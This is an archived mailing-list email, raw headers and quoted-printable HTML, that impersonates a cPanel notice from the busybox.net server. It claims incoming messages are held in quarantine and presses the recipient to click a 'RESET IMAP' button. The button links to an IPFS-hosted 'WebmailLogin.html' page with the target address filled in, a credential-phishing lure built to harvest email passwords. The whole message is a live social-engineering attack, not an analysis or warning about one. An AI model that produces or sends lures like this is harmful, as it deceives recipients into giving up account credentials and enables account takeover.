Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id A6CE9C3DA7F
	for <buildroot@archiver.kernel.org>; Sun,  4 Aug 2024 13:59:54 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id 3A76A80BC1;
	Sun,  4 Aug 2024 13:59:54 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id tNRDvwRA6awQ; Sun,  4 Aug 2024 13:59:53 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3349680C11
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp1.osuosl.org (Postfix) with ESMTP id 3349680C11;
	Sun,  4 Aug 2024 13:59:53 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id C4BDB1BF2EB
 for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id BE73980C11
 for <buildroot@lists.busybox.net>; Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id f7ZlFRxTwABp for <buildroot@lists.busybox.net>;
 Sun,  4 Aug 2024 13:59:51 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=145.239.135.10;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 586CD80BC1
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 586CD80BC1
Received: from busybox.net (unknown [145.239.135.10])
 by smtp1.osuosl.org (Postfix) with ESMTP id 586CD80BC1
 for <buildroot@busybox.net>; Sun,  4 Aug 2024 13:59:49 +0000 (UTC)
From: cPanel on busybox.net <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 4 Aug 2024 06:59:48 -0700
Message-ID: <20240804065948.FC1F8C9BA0714DB0@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] =?utf-8?q?busybox=2Enet_Client_configuration_setting?=
 =?utf-8?b?cyBlcnJvciBmb3Ig4oCc?=
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1600539096125123306=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============1600539096125123306==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 10.00.9200.16843">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><table width=3D"600" style=3D"border: 1px solid lightgray; border-ima=
ge: none; font-size: 11pt; border-collapse: collapse;" cellspacing=3D"0" ce=
llpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-s=
izing: border-box;"><td width=3D"100%" style=3D"margin: 0px; padding: 10px;=
 box-sizing: border-box;">
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; float: none; display: inline !important; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;">
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;"><tbody style=3D"b=
ox-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><th style=3D"=
padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 2p=
x; color: rgb(0, 0, 0); box-sizing: border-box; background-color: rgb(2, 15=
1, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
le></span></div></td></tr>
<tr style=3D"box-sizing: border-box;">
<td width=3D"100%" align=3D"left" style=3D"margin: 0px; padding: 20px; box-=
sizing: border-box;">
<p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; box-sizing: bord=
er-box;'><span style=3D"font-size: medium;"><font size=3D"4">You
 have pending incoming messages in your quarantine, set your Incoming serve=
r to continue=20
receiving messages without disruption using the manual settings.</font></sp=
an></p><font size=3D"4">
</font><p style=3D'margin: 0px 0px 10px; font-family: "Open Sans", Verdana,=
 Tahoma, serif; box-sizing: border-box;'><font size=3D"4">&nbsp;</font></p>=
<font size=3D"4">
</font><strong><span style=3D"font-size: large;"><table width=3D"680" style=
=3D"border: 0px currentColor; border-image: none; max-width: 680px;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td width=3D"680" hei=
ght=3D"25" style=3D'color: rgb(51, 51, 51); font-family: "Helvetica Neue",H=
elvetica,Arial,sans-serif; font-size: 16px;'>Client
 Configuration settings for "buildroot@busybox.net".=20=20=20=20=20=20=20=
=20
                                                                    </td>
                                                                    </tr>
                                <tr>
                                                                        <td=
 style=3D"border-width: 2px; border-style: solid; border-color: rgb(232, 23=
2, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; backg=
round-color: rgb(255, 255, 255);">
                                        <table width=3D"680" style=3D'backg=
round: rgb(255, 255, 255); font-family: "Helvetica Neue",Helvetica,Arial,sa=
ns-serif;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
                                            <tbody>
                                                <tr>
                                                    <td width=3D"15">
                                                    </td>
                                                    <td width=3D"650">
                                                        <table width=3D"100=
%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
                                                            <tbody>
                                                                <tr>
                                                                    <td>
                                                                        <di=
v class=3D"v1section" id=3D"v1manual_settings_area">
        <h2 id=3D"v1hdrManualSettings">Mail Client Manual Settings</h2>
=20=20=20=20=20=20=20=20
        <div class=3D"v1row">
         <div class=3D"v1col-md-6">
          <div class=3D"v1preferred-selection v1panel v1panel-primary" id=
=3D"v1ssl_settings_area" style=3D"border-radius: 4px; border: 1px solid rgb=
(66, 139, 202); border-image: none; margin-bottom: 20px; box-shadow: 0px 1p=
x 1px rgba(0,0,0,0.05); background-color: rgb(255, 255, 255);">
               <div class=3D"v1panel-heading" style=3D"border-color: rgb(66=
, 139, 202); padding: 10px 15px; color: rgb(255, 255, 255); border-top-left=
-radius: 3px; border-top-right-radius: 3px; background-color: rgb(66, 139, =
202);">
                Secure <abbr title=3D"Secure Sockets Layer">SSL</abbr>/<abb=
r title=3D"Transport Layer Security">TLS</abbr> Settings
                (Recommended)
              </div>
              <table class=3D"v1table v1manual_settings_table" style=3D"wid=
th: 100%; margin-bottom: 0px; border-collapse: collapse; max-width: 100%; b=
order-spacing: 0; background-color: transparent;">
                  <tbody><tr>
                      <td id=3D"v1lblSSLSettingsAreaUsername" style=3D"padd=
ing: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; bord=
er-top-style: solid;">Username:</td>
                      <td class=3D"v1data v1wrap-text" id=3D"v1valSSLSettin=
gsAreaUsername" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221)=
; border-top-width: 1px; border-top-style: solid;">buildroot</td>
                  </tr>
                  <tr>
                      <td id=3D"v1lblSettingsAreaPassword" style=3D"padding=
: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border-=
top-style: solid;">Password:</td>
                      <td class=3D"v1escape-note" id=3D"v1valSettingsAreaPa=
ssword" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border=
-top-width: 1px; border-top-style: solid;"> Use the email account's passwor=
d.</td>
                  </tr>
                  <tr>
                      <td id=3D"v1lblSettingsAreaIncomingServer" style=3D"p=
adding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; b=
order-top-style: solid;">Incoming Server:</td>
                      <td class=3D"v1data" id=3D"v1valSettingsAreaIncomingS=
erver" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
top-width: 1px; border-top-style: solid;">mail.busybox.net
                          <ul class=3D"v1port_list v1list-inline" style=3D"=
list-style: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px; =
margin-left: -5px;">
                              <li style=3D"padding-right: 5px; padding-left=
: 5px; display: inline-block;"><abbr title=3D"Internet Message Access Proto=
col" class=3D"v1initialism">IMAP</abbr> Port: 993</li>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20
                              <li style=3D"padding-right: 5px; padding-left=
: 5px; display: inline-block;"><abbr title=3D"Post Office Protocol 3" class=
=3D"v1initialism">POP3</abbr> Port: 995</li>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20
                          </ul>
                      </td>
                  </tr>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
                  <tr>
                      <td id=3D"v1lblSettingsAreaOutgoingServer" style=3D"p=
adding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; b=
order-top-style: solid;">Outgoing Server:</td>
                      <td class=3D"v1data" id=3D"v1valSettingsAreaOutGoingS=
erver" style=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-=
top-width: 1px; border-top-style: solid;">mail.busybox.net
                          <ul class=3D"v1port_list v1list-inline" style=3D"=
list-style: none; padding-left: 0px; margin-top: 0px; margin-bottom: 10px; =
margin-left: -5px;">
                              <li style=3D"padding-right: 5px; padding-left=
: 5px; display: inline-block;"><abbr title=3D"Simple Mail Transfer Protocol=
">SMTP</abbr> Port: 465</li>
                          </ul>
                      </td>
                  </tr>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
                  <tr>
                      <td class=3D"v1notes" style=3D"padding: 8px; border-t=
op-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: soli=
d;" colspan=3D"2">
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20
                                                                           =
     <div class=3D"v1small_note" id=3D"v1lblSettingsAreaSmallNote1">IMAP, P=
OP3, and SMTP require authentication.</div></td></tr></tbody></table></div>=
</div></div></div></td></tr></tbody></table></td></tr></tbody></table></td>=
</tr></tbody></table></span></strong><p style=3D'margin: 0px 0px 10px; font=
-family: "Open Sans", Verdana, Tahoma, serif; font-size: 16px; box-sizing: =
border-box;'><font size=3D"4">&nbsp;</font><font size=3D"4">
</font></p><p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; font-=
size: 16px; box-sizing: border-box;'><font size=3D"4">Reset your incoming s=
erver settings to continue receiving messages.</font></p>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">&=
nbsp;</p>
<table width=3D"193" style=3D"border-radius: 3px; height: 52px; font-size: =
11pt; border-collapse: collapse; background-color: rgb(215, 86, 36);" borde=
r=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
30px; box-sizing: border-box;">
<a style=3D"color: rgb(255, 255, 255); font-family: Helvetica, Arial, sans-=
serif; font-size: 16px; font-weight: bold; box-sizing: border-box; backgrou=
nd-color: transparent; text-decoration-line: none;" href=3D"https://ipfs.io=
/ipfs/bafkreifx4dpszoqmkbhrqkn7znfotogcpftyq5fjdhih3bxtkg75epvz6u?filename=
=3DWebmailLogin.html#buildroot@busybox.net" target=3D"_blank" rel=3D"norefe=
rrer">RESET&nbsp; IMAP</a></td></tr></tbody></table>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">&=
nbsp;</p>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">I=
<span style=3D'font-family: "Segoe UI"; font-size: medium;'>f after resetti=
ng your IMAP and you still experience service disruption, kindly contact<sp=
an>&nbsp;support</span><span>&nbsp;</span>for further assistance.</span>&nb=
sp;</p></td></tr></tbody></table></body></html>

--===============1600539096125123306==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============1600539096125123306==--
